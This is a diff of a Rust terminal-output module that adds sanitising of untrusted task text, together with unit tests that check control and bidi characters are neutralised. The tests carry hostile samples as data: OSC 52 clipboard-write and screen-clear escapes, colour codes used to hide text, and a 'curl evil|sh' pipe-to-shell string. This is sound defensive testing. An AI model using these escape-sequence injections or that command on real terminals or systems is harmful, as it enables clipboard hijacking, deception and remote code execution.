@@ -17,7 +17,13 @@
 //!
 //! Colour is decided once at startup (`init`) and read through `enabled()`;
 //! every painter is a no-op when it is off, so callers never branch on it.
+//!
+//! Task text is untrusted (fleet captures, email, Telegram, git, agents), so
+//! every renderer here passes it through `sanitize` on the way out: control
+//! and bidi characters become a visible U+FFFD instead of reaching the
+//! terminal as an escape sequence.
 
+use std::borrow::Cow;
 use std::collections::BTreeMap;
 use std::io::IsTerminal;
 use std::sync::OnceLock;
@@ -58,6 +64,18 @@ impl Ink {
 /// on the bottom one, exactly like ptui.
 pub const ACCENT: [Ink; 3] = [Ink::Cyan, Ink::Violet, Ink::Magenta];
 
+const PALETTE: [Ink; 9] = [
+    Ink::Cyan,
+    Ink::Violet,
+    Ink::Magenta,
+    Ink::Green,
+    Ink::Amber,
+    Ink::Red,
+    Ink::Slate,
+    Ink::Paper,
+    Ink::Steel,
+];
+
 // ── Colour switch ─────────────────────────────────────────────────────────────
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -89,14 +107,137 @@ pub fn init(mode: ColorMode) {
 }
 
 pub fn enabled() -> bool {
+    #[cfg(test)]
+    if let Some(on) = TEST_COLOR.with(std::cell::Cell::get) {
+        return on;
+    }
     *COLOR.get().unwrap_or(&false)
+}
+
+// Per-thread colour override so unit tests can exercise both modes without
+// racing on the process-wide switch.
+#[cfg(test)]
+thread_local! {
+    static TEST_COLOR: std::cell::Cell<Option<bool>> = const { std::cell::Cell::new(None) };
+}
+
+// ── Sanitising ────────────────────────────────────────────────────────────────
+
+/// Visible, width-1 stand-in for a character the terminal would act on.
+const STAND_IN: char = ptask_core::text::STAND_IN;
+
+/// Make untrusted text safe to print (multi-line): see
+/// [`ptask_core::text::sanitize`] — the one predicate the CLI, TUI and core
+/// errors share.
+pub use ptask_core::text::{has_hazard, one_line, sanitize, sanitize_strict};
+
+/// Length of the SGR sequence at the start of `s` if it is one this module
+/// emits outside gradients: reset, bold, dim, or a palette foreground.
+fn own_sgr_len(s: &str) -> Option<usize> {
+    for fixed in ["\x1b[0m", "\x1b[1m", "\x1b[2m"] {
+        if s.starts_with(fixed) {
+            return Some(fixed.len());
+        }
+    }
+    PALETTE.iter().find_map(|ink| {
+        let (r, g, b) = ink.rgb();
+        let seq = format!("\x1b[38;2;{r};{g};{b}m");
+        s.starts_with(&seq).then_some(seq.len())
+    })
+}
+
+/// Single-line safe text for a slot that may already carry this module's
+/// paint (kv values, table cells, prompt and bullet text): with colour on,
+/// our own SGR sequences survive and every other escape is neutralised;
+/// line breaks fold to a visible mark so a value cannot forge a row.
+fn line_painted(text: &str) -> Cow<'_, str> {
+    if !enabled() || !text.contains('\x1b') {
+        return one_line(text);
+    }
+    let mut out = String::with_capacity(text.len());
+    let mut rest = text;
+    while let Some(i) = rest.find('\x1b') {
+        out.push_str(&one_line(&rest[..i]));
+        let tail = &rest[i..];
+        match own_sgr_len(tail) {
+            Some(n) => {
+                out.push_str(&tail[..n]);
+                rest = &tail[n..];
+            }
+            None => {
+                out.push(STAND_IN);
+                rest = &tail[1..];
+            }
+        }
+    }
+    out.push_str(&one_line(rest));
+    Cow::Owned(out)
+}
+
+/// A value for a layout slot (kv value, bullet detail, prompt text, table
+/// cell). Untrusted text is [`Cell::Raw`] — the default for `String` and
+/// `&str` — and is painted by the slot itself, so every escape it carries is
+/// neutralised, this module's own SGR codes included. Only output of this
+/// module's painters may be wrapped as [`Cell::Painted`] (via [`painted`]);
+/// it keeps its SGR. Search for `painted(` to audit every trusted value.
+#[derive(Debug, Clone)]
+pub enum Cell {
+    Raw(String),
+    Painted(String),
+}
+
+impl From<String> for Cell {
+    fn from(s: String) -> Self {
+        Cell::Raw(s)
+    }
+}
+
+impl From<&str> for Cell {
+    fn from(s: &str) -> Self {
+        Cell::Raw(s.to_string())
+    }
+}
+
+impl From<&String> for Cell {
+    fn from(s: &String) -> Self {
+        Cell::Raw(s.clone())
+    }
+}
+
+/// Table rows whose every cell is output of this module's painters (or a
+/// plain number): marks each cell [`painted`].
+pub fn painted_rows(rows: Vec<Vec<String>>) -> Vec<Vec<Cell>> {
+    rows.into_iter()
+        .map(|r| r.into_iter().map(painted).collect())
+        .collect()
+}
+
+/// Mark the output of this module's painters as trusted for a layout slot.
+pub fn painted(s: impl Into<String>) -> Cell {
+    Cell::Painted(s.into())
+}
+
+impl Cell {
+    /// Render for a single-line slot: raw text painted in `ink` (or left
+    /// unpainted when `ink` is `None`), painted text kept with only this
+    /// module's own SGR.
+    fn render(&self, ink: Option<Ink>) -> String {
+        match self {
+            Cell::Raw(s) => match ink {
+                Some(ink) => paint(s, ink),
+                None => one_line(s).into_owned(),
+            },
+            Cell::Painted(s) => line_painted(s).into_owned(),
+        }
+    }
 }
 
 // ── Painters ──────────────────────────────────────────────────────────────────
 
 fn sgr(text: &str, (r, g, b): (u8, u8, u8), bold: bool, dim: bool) -> String {
+    let text = one_line(text);
     if !enabled() || text.is_empty() {
-        return text.to_string();
+        return text.into_owned();
     }
     let mut out = String::with_capacity(text.len() + 24);
     if bold {
@@ -106,7 +247,7 @@ fn sgr(text: &str, (r, g, b): (u8, u8, u8), bold: bool, dim: bool) -> String {
         out.push_str("\x1b[2m");
     }
     out.push_str(&format!("\x1b[38;2;{r};{g};{b}m"));
-    out.push_str(text);
+    out.push_str(&text);
     out.push_str("\x1b[0m");
     out
 }
@@ -130,8 +271,9 @@ fn mix(a: (u8, u8, u8), b: (u8, u8, u8), t: f32) -> (u8, u8, u8) {
 
 /// Per-character colour ramp across two or more palette stops.
 pub fn gradient(text: &str, stops: &[Ink]) -> String {
+    let text = one_line(text);
     if !enabled() || text.is_empty() {
-        return text.to_string();
+        return text.into_owned();
     }
     let cols: Vec<(u8, u8, u8)> = if stops.is_empty() {
         ACCENT.iter().map(|i| i.rgb()).collect()
@@ -195,9 +337,10 @@ pub fn pad(text: &str, width: usize, align: Align) -> String {
     }
 }
 
-/// Clip to a display width, ellipsised. Returns PLAIN text — clip before you paint.
+/// Clip to a display width, ellipsised. Returns PLAIN, sanitised, single-line
+/// text — clip before you paint.
 pub fn clip(text: &str, width: usize) -> String {
-    let plain = strip_ansi(text);
+    let plain = strip_ansi(&line_painted(text));
     if plain.width() <= width {
         return plain;
     }
@@ -402,10 +545,11 @@ pub fn table_width(columns: &[Column]) -> usize {
 
 /// Box-ruled table. `bands` maps a row index to a band label drawn above that
 /// row (the severity tiers in `pt list`, the way fleet-upgrade bands nodes by
-/// tier). Cells may be pre-painted; they are clipped to the column width.
+/// tier). Cells are raw (untrusted, sanitised here) or [`painted`]; they are
+/// clipped to the column width.
 pub fn table(
     columns: &[Column],
-    rows: &[Vec<String>],
+    rows: &[Vec<Cell>],
     bands: &BTreeMap<usize, String>,
 ) -> Vec<String> {
     let indent = "  ";
@@ -445,11 +589,11 @@ pub fn table(
             .iter()
             .enumerate()
             .map(|(j, c)| {
-                let cell = row.get(j).map(String::as_str).unwrap_or("");
-                let cell = if vis_len(cell) <= c.width {
-                    cell.to_string()
+                let cell = row.get(j).map(|c| c.render(None)).unwrap_or_default();
+                let cell = if vis_len(&cell) <= c.width {
+                    cell
                 } else {
-                    clip(cell, c.width)
+                    clip(&cell, c.width)
                 };
                 format!(" {} ", pad(&cell, c.width, c.align))
             })
@@ -460,19 +604,16 @@ pub fn table(
     out
 }
 
-/// Key/value block: slate key column, paper value.
-pub fn kv(pairs: &[(&str, String)], key_width: usize) -> Vec<String> {
+/// Key/value block: slate key column, paper value (a [`painted`] value keeps
+/// its own paint).
+pub fn kv(pairs: &[(&str, Cell)], key_width: usize) -> Vec<String> {
     pairs
         .iter()
         .map(|(k, v)| {
             format!(
                 "  {}{}",
                 pad(&paint(k, Ink::Slate), key_width, Align::Left),
-                if v.contains('\x1b') {
-                    v.clone()
-                } else {
-                    paint(v, Ink::Paper)
-                }
+                v.render(Some(Ink::Paper))
             )
         })
         .collect()
@@ -499,12 +640,12 @@ pub fn section(title: &str, ink: Ink, note: &str) -> String {
 
 /// `     • name   detail` — a name and its detail, name clipped to a column so
 /// the detail column never drifts.
-pub fn bullet(name: &str, detail: &str, ink: Ink, width: usize) -> String {
+pub fn bullet(name: &str, detail: impl Into<Cell>, ink: Ink, width: usize) -> String {
     format!(
         "     {} {} {}",
         paint("•", ink),
         pad(&paint(&clip(name, width), Ink::Paper), width, Align::Left),
-        paint(detail, Ink::Slate)
+        detail.into().render(Some(Ink::Slate))
     )
 }
 
@@ -579,7 +720,7 @@ pub fn task_table(
     cols.push(Column::new("TITLE", width.saturating_sub(fixed).max(24)));
     let title_w = cols.last().map(|c| c.width).unwrap_or(24);
 
-    let mut rows: Vec<Vec<String>> = Vec::with_capacity(tasks.len());
+    let mut rows: Vec<Vec<Cell>> = Vec::with_capacity(tasks.len());
     let mut bands = BTreeMap::new();
     let mut last_tier: Option<i64> = None;
     for t in tasks {
@@ -591,28 +732,32 @@ pub fn task_table(
             last_tier = Some(t.priority);
         }
         let id = t.pt_id.as_deref().unwrap_or("------");
-        let mut row = vec![priority_pill(t.priority), pt_id(id), status_pill(&t.status)];
+        let mut row = vec![
+            painted(priority_pill(t.priority)),
+            painted(pt_id(id)),
+            painted(status_pill(&t.status)),
+        ];
         if show_due {
-            row.push(due_cell(t.deadline.as_deref()));
+            row.push(painted(due_cell(t.deadline.as_deref())));
         }
-        row.push(paint(&clip(&t.title, title_w), Ink::Paper));
+        row.push(painted(paint(&clip(&t.title, title_w), Ink::Paper)));
         rows.push(row);
         if verbose {
             let blank = cols.len() - 1;
             if !t.description.is_empty() {
                 let snippet: String = t.description.lines().next().unwrap_or("").to_string();
-                let mut r = vec![String::new(); blank];
-                r.push(paint(&clip(&snippet, title_w), Ink::Slate));
+                let mut r = vec![Cell::from(""); blank];
+                r.push(painted(paint(&clip(&snippet, title_w), Ink::Slate)));
                 rows.push(r);
             }
-            let mut r = vec![String::new(); blank];
+            let mut r = vec![Cell::from(""); blank];
             let mut meta = format!("uuid {}", t.id);
             if let Some(d) = &t.deadline
                 && !show_due
             {
                 meta.push_str(&format!(" · due {d}"));
             }
-            r.push(dim(&clip(&meta, title_w), Ink::Slate));
+            r.push(painted(dim(&clip(&meta, title_w), Ink::Slate)));
             rows.push(r);
         }
     }
@@ -636,6 +781,7 @@ pub fn due_cell(deadline: Option<&str>) -> String {
 
 /// Word-wrap plain text to a display width, indenting continuation lines.
 pub fn wrap(text: &str, width: usize, indent: &str) -> Vec<String> {
+    let text = sanitize(text);
     let mut lines = Vec::new();
     let mut cur = String::new();
     for word in text.split_whitespace() {
@@ -659,11 +805,11 @@ pub fn wrap(text: &str, width: usize, indent: &str) -> Vec<String> {
 }
 
 /// Prompt line for interactive loops: `  ▸ question  [k]eep [d]one …  > `.
-pub fn prompt(text: &str, keys: &str) -> String {
+pub fn prompt(text: impl Into<Cell>, keys: &str) -> String {
     format!(
         "  {}{}  {} {} ",
         paint("▸ ", Ink::Violet),
-        paint(text, Ink::Paper),
+        text.into().render(Some(Ink::Paper)),
         dim(keys, Ink::Slate),
         bold(">", Ink::Cyan)
     )
@@ -761,5 +907,228 @@ mod tests {
     fn outcome_line_reads_verb_id_title() {
         let l = outcome(Status::Ok, "done", "PT-9", "ship it", "rescored 3");
         assert_eq!(l, "  ✔ done      PT-9  ship it   rescored 3");
+    }
+
+    /// OSC 52 clipboard write, screen clear, carriage return, C1 CSI.
+    const HOSTILE: &str = "\x1b]52;c;eA==\x07\x1b[2J\r\u{9b}31m";
+
+    fn with_colour<T>(on: bool, f: impl FnOnce() -> T) -> T {
+        TEST_COLOR.with(|c| c.set(Some(on)));
+        let out = f();
+        TEST_COLOR.with(|c| c.set(None));
+        out
+    }
+
+    /// Every ESC opens an SGR form this module emits (any 24-bit colour, for
+    /// gradients); no other control character but '\n'; no bidi control.
+    fn assert_safe(label: &str, s: &str) {
+        let mut rest = s;
+        while let Some(c) = rest.chars().next() {
+            if c == '\x1b' {
+                let tail = &rest[1..];
+                let n = ["[0m", "[1m", "[2m"]
+                    .iter()
+                    .find(|f| tail.starts_with(**f))
+                    .map(|f| f.len())
+                    .or_else(|| {
+                        let body = tail.strip_prefix("[38;2;")?;
+                        let end = body.find('m')?;
+                        body[..end]
+                            .split(';')
+                            .all(|ch| ch.parse::<u8>().is_ok())
+                            .then_some("[38;2;".len() + end + 1)
+                    })
+                    .unwrap_or_else(|| panic!("{label}: foreign escape in {s:?}"));
+                rest = &tail[n..];
+                continue;
+            }
+            assert!(
+                !(c.is_control() && c != '\n') && !ptask_core::text::is_hazard(c),
+                "{label}: {c:?} in {s:?}"
+            );
+            rest = &rest[c.len_utf8()..];
+        }
+    }
+
+    fn renderers(t: &str) -> Vec<(&'static str, String)> {
+        let task = ptask_core::Task {
+            id: "uuid-1".into(),
+            pt_id: Some(t.to_string()),
+            title: t.to_string(),
+            description: t.to_string(),
+            priority: 3,
+            status: t.to_string(),
+            created_at: String::new(),
+            updated_at: String::new(),
+            deadline: Some(t.to_string()),
+            source_type: "cli".into(),
+            ai_reasoning: String::new(),
+            kind: "ship".into(),
+            deliverable: None,
+        };
+        let mut bands = BTreeMap::new();
+        bands.insert(0usize, "tier".to_string());
+        vec![
+            ("sanitize", sanitize(t).into_owned()),
+            ("paint", paint(t, Ink::Paper)),
+            ("bold", bold(t, Ink::Paper)),
+            ("dim", dim(t, Ink::Slate)),
+            ("gradient", gradient(t, &[])),
+            ("clip", clip(t, 12)),
+            ("clip wide", clip(t, 200)),
+            ("pad", pad(&paint(t, Ink::Paper), 40, Align::Right)),
+            ("pill", pill(Status::Warn, t)),
+            ("status_pill", status_pill(t)),
+            ("pt_id", pt_id(t)),
+            ("due_cell", due_cell(Some(t))),
+            ("headline", headline(t, Some((t, Ink::Amber)), t).join("\n")),
+            ("banner", banner(t, t, Some((t, Ink::Cyan))).join("\n")),
+            (
+                "table",
+                table(
+                    &[Column::new("A", 8), Column::new("B", 60)],
+                    &[vec![t.into(), painted(paint(t, Ink::Paper))]],
+                    &bands,
+                )
+                .join("\n"),
+            ),
+            (
+                "kv",
+                kv(
+                    &[
+                        ("plain", t.into()),
+                        ("painted", painted(paint(t, Ink::Red))),
+                    ],
+                    10,
+                )
+                .join("\n"),
+            ),
+            ("section", section(t, Ink::Red, t)),
+            ("bullet", bullet(t, t, Ink::Cyan, 10)),
+            ("note", note(t)),
+            ("outcome", outcome(Status::Ok, t, t, t, t)),
+            ("footer", footer(2, t, t)),
+            ("empty", empty(t)),
+            ("wrap", wrap(t, 8, "  ").join("\n")),
+            ("prompt", prompt(t, t)),
+            (
+                "task_table",
+                task_table(&[task], true, true, true).join("\n"),
+            ),
+        ]
+    }
+
+    #[test]
+    fn sanitize_replaces_controls_and_bidi_with_a_visible_stand_in() {
+        assert!(matches!(sanitize("plain · ünïcode 日本"), Cow::Borrowed(_)));
+        assert_eq!(
+            sanitize(HOSTILE),
+            "\u{fffd}]52;c;eA==\u{fffd}\u{fffd}[2J\u{fffd}\u{fffd}31m"
+        );
+        // Bidi overrides, isolates and marks reorder what follows.
+        assert_eq!(
+            sanitize("a\u{202e}b\u{2066}c\u{2069}d\u{200f}e\u{61c}f"),
+            "a\u{fffd}b\u{fffd}c\u{fffd}d\u{fffd}e\u{fffd}f"
+        );
+        // Newlines survive; a CRLF line end displays the same as LF; a tab is
+        // a space; a lone CR, BS, DEL and NEL do not survive.
+        assert_eq!(sanitize("a\r\nb\n\tc"), "a\nb\n c");
+        // has_hazard: only what changes what the terminal shows counts.
+        assert!(has_hazard(HOSTILE) && has_hazard("x\ry") && has_hazard("a\u{202e}b"));
+        assert!(!has_hazard("Dear Alan,\r\n\tthe numbers.\n") && !has_hazard(""));
+        assert_eq!(
+            sanitize("x\ry\u{8}z\u{7f}w\u{85}"),
+            "x\u{fffd}y\u{fffd}z\u{fffd}w\u{fffd}"
+        );
+    }
+
+    #[test]
+    fn every_renderer_neutralises_hostile_text_without_colour() {
+        let t = format!("pay {HOSTILE} \u{202e}now");
+        for (name, out) in with_colour(false, || renderers(&t)) {
+            assert!(
+                out.chars().all(|c| !c.is_control() || c == '\n'),
+                "{name}: {out:?}"
+            );
+            assert_safe(name, &out);
+        }
+        // Single-line slots flatten a newline instead of forging a row.
+        assert_eq!(clip("a\nb", 10), "a\u{2424}b");
+        let rows = with_colour(false, || {
+            table(
+                &[Column::new("T", 5)],
+                &[vec!["a\nb".into()]],
+                &BTreeMap::new(),
+            )
+        });
+        assert_eq!(rows.len(), 5, "{rows:?}");
+        assert!(rows[3].contains("│ a\u{2424}b   │"), "{rows:?}");
+    }
+
+    #[test]
+    fn every_renderer_keeps_only_its_own_sgr_with_colour() {
+        let t = format!("pay {HOSTILE} \u{202e}now");
+        for (name, out) in with_colour(true, || renderers(&t)) {
+            assert_safe(name, &out);
+        }
+        // Raw text cannot smuggle SGR either: painters neutralise all of it
+        // (here a black foreground and conceal, which would hide text).
+        let sneaky = "ok\x1b[38;2;0;0;0mhidden\x1b[8m; curl evil|sh";
+        let out = with_colour(true, || paint(sneaky, Ink::Paper));
+        assert!(
+            !out.contains("\x1b[38;2;0;0;0m") && !out.contains("\x1b[8m"),
+            "{out:?}"
+        );
+        assert!(out.contains("\u{fffd}[8m; curl evil|sh"), "{out:?}");
+    }
+
+    #[test]
+    fn pre_painted_values_keep_their_paint_with_colour() {
+        with_colour(true, || {
+            let pill = status_pill("done");
+            // kv and bullet keep a value that is already painted...
+            assert!(kv(&[("status", painted(pill.clone()))], 8)[0].ends_with(&pill));
+            let detail = format!("{}  {}", pill, paint("title", Ink::Paper));
+            assert!(bullet("PT-1", painted(detail.clone()), Ink::Amber, 6).ends_with(&detail));
+            // ...but a foreign escape inside one is still neutralised.
+            let tainted = format!("{pill}\x1b]52;c;eA==\x07");
+            let line = kv(&[("status", painted(tainted))], 8).join("");
+            assert!(
+                line.contains(&pill) && !line.contains("\x1b]52"),
+                "{line:?}"
+            );
+            assert_safe("tainted kv", &line);
+            // A clipped pre-painted cell loses its paint, never gains garbage.
+            assert_eq!(clip(&paint("abcdef", Ink::Red), 4), "abc…");
+        });
+    }
+
+    #[test]
+    fn raw_text_cannot_smuggle_this_modules_own_sgr() {
+        // A title carrying the exact palette codes painters emit.
+        let (r, g, b) = Ink::Slate.rgb();
+        let smuggled = format!("pay\x1b[38;2;{r};{g};{b}mHIDDEN\x1b[0m\x1b[1m");
+        with_colour(true, || {
+            let mut outs = vec![
+                ("kv", kv(&[("desc", smuggled.as_str().into())], 8).join("")),
+                ("bullet", bullet("PT-1", smuggled.as_str(), Ink::Amber, 6)),
+                ("prompt", prompt(format!("undo \"{smuggled}\"?"), "[y/N]")),
+            ];
+            outs.extend(
+                table(
+                    &[Column::new("T", 40)],
+                    &[vec![smuggled.as_str().into()]],
+                    &BTreeMap::new(),
+                )
+                .into_iter()
+                .map(|l| ("table", l)),
+            );
+            for (name, out) in outs {
+                assert!(!out.contains("pay\x1b"), "{name}: {out:?}");
+                if out.contains("pay") {
+                    assert!(out.contains("pay\u{fffd}[38;2;"), "{name}: {out:?}");
+                }
+            }
+        });
     }
 }
